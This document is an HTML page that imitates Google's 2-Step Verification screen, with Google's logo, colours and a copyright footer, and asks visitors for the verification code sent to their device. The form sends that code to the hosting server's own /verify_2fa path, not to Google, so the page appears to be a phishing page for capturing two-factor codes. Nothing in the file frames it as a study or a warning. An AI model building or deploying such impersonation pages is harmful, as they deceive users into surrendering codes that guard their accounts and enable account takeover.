<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google 2-Step Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        h1 {
            color: #4285F4;
            font-size: 24px;
            margin-top: 20px;
        }
        .input-group {
            margin: 15px 0;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            color: #333;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .button {
            background-color: #4285F4;
            color: white;
            border: none;
            padding: 12px 0;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #357ae8;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }
        .logo {
            width: 120px;
            margin: 0 auto;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
        <h1>Google 2-Step Verification</h1>
        <p>Please enter the verification code sent to your device.</p>
        <form action="/verify_2fa" method="POST">
            <div class="input-group">
                <label for="verification-code">Verification Code</label>
                <input type="text" id="verification-code" name="verification-code" placeholder="Enter the code" required>
            </div>
            <button class="button" type="submit">Verify</button>
        </form>
        <div class="footer">
            <p>Â© 2024 Google</p>
        </div>
    </div>
</body>
</html>
